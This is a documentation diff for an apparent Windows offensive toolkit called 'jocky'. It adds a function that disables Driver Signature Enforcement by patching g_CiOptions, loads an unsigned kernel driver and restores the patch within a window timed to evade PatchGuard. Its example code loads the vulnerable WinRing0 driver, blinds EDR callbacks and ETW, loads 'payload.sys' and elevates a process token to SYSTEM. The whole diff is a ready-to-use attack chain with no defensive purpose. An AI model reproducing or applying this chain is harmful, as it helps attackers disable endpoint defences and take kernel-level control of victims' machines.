@@ -859,37 +859,66 @@ ffi jocky_restore_dse(i8*) -> bool;
 
 ---
 
-### Full exploitation example
+### `jocky_dse_load_driver(ctx, driver_path, service_name) -> bool`
+
+**Recommended function for loading unsigned drivers.**  Wraps
+`jocky_disable_dse` + `NtLoadDriver` + `jocky_restore_dse` into a single
+timed, PatchGuard-safe window.
+
+| Phase | Action |
+|---|---|
+| **Pre-window** | Enable `SeLoadDriverPrivilege`; register SCM service entry |
+| **Window open** | `jocky_disable_dse(ctx)` → `CI!g_CiOptions = 0` |
+| **Load** | `NtLoadDriver(\Registry\...\<svc>)` — direct NTAPI, no SCM round-trip |
+| **Window close** | `jocky_restore_dse(ctx)` — **unconditional**, even on load error |
+| **Post-window** | Delete SCM service entry; driver remains loaded in kernel |
+
+Target window duration: **< 500 ms** (dominated by driver `DriverEntry`, not
+the patch itself).  The restore is guaranteed to run even if `NtLoadDriver`
+blocks or returns an error, keeping the patched state duration well below
+PatchGuard's re-verification timer (~5–10 minutes on retail builds).
+
+`service_name` may be `NULL` to auto-generate a name from a hash of the path.
 
 ```
-ffi jocky_runtime_init()             -> i32;
-ffi jocky_byovd_load(i8*, i8*, i8*) -> bool;
-ffi jocky_disable_edr_callbacks(i8*) -> bool;
-ffi jocky_disable_etw(i8*)           -> bool;
-ffi jocky_disable_dse(i8*)           -> bool;
-ffi jocky_elevate_token(i8*, i32)    -> bool;
-ffi jocky_restore_dse(i8*)           -> bool;
-ffi jocky_byovd_unload(i8*)          -> void;
+ffi jocky_dse_load_driver(i8*, i8*, i8*) -> bool;
+```
+
+---
+
+### DSE section example
+
+```jky
+ffi jocky_byovd_load(i8*, i8*, i8*)     -> bool;
+ffi jocky_disable_edr_callbacks(i8*)    -> bool;
+ffi jocky_disable_etw(i8*)              -> bool;
+ffi jocky_dse_load_driver(i8*, i8*, i8*)-> bool;   // NEW: all-in-one
+ffi jocky_elevate_token(i8*, i32)       -> bool;
+ffi jocky_byovd_unload(i8*)             -> void;
 
 fn main() -> void {
-    let t: i32 = jocky_runtime_init();
-    if t != 0 { return; }
-
-    let ctx: i8* = 0;   // allocate 584 bytes
+    let ctx: i8* = 0;
     let ok: bool = jocky_byovd_load("WinRing0x64", "WinRing0_1_2_0", ctx);
     if !ok { return; }
 
-    // Blind EDR
+    // Blind EDR before loading our payload driver
     jocky_disable_edr_callbacks(ctx);
     jocky_disable_etw(ctx);
 
-    // Load unsigned driver after disabling DSE
-    jocky_disable_dse(ctx);
-    // ... load unsigned driver via SCM ...
-    jocky_restore_dse(ctx);
+    // Load unsigned driver — DSE window opens and closes automatically
+    // g_CiOptions is patched for < 500 ms then unconditionally restored
+    let loaded: bool = jocky_dse_load_driver(
+        ctx,
+        "C:\\payload.sys",   // absolute path to unsigned .sys
+        "payload_svc"        // SCM service name (NULL = auto)
+    );
+
+    if loaded {
+        // payload.sys is now running as a kernel driver
+        // Use jocky_byovd_t or direct IOCTL to communicate with it
+    }
 
     // Escalate self to SYSTEM
-    // (GetCurrentProcessId() via ffi or hardcode your PID)
     let my_pid: i32 = 1234;
     jocky_elevate_token(ctx, my_pid);
 
@@ -897,9 +926,12 @@ fn main() -> void {
 }
 ```
 
----
+> **Manual control alternative:** if you need to load multiple unsigned drivers
+> back-to-back, you can call `jocky_disable_dse()` once, load them all via
+> `NtLoadDriver`, then call `jocky_restore_dse()`.  Keep the total window time
+> under 2 seconds.
 
----
+
 
 ## 11  Exfiltration  *(Windows only)*
 
